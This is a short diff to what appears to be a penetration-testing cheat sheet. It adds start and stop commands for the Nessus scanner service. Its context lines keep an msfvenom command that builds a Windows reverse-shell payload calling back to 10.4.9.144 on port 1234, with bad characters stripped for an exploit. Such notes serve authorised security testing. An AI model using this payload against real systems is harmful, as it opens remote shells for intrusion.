@@ -522,6 +522,17 @@ generate payload
 msfvenom -p windows/shell_reverse_tcp LHOST=10.4.9.144 LPORT=1234 EXITFUNC=thread -b "\x00\x04\x05\x3e\x3f\xe1\xe2" -f c
 ```
 
+## Nessus
+
+start
+```
+/sbin/service nessusd start
+```
+
+stop
+```
+/sbin/service nessusd stop
+```
 
 ## CheckList
 
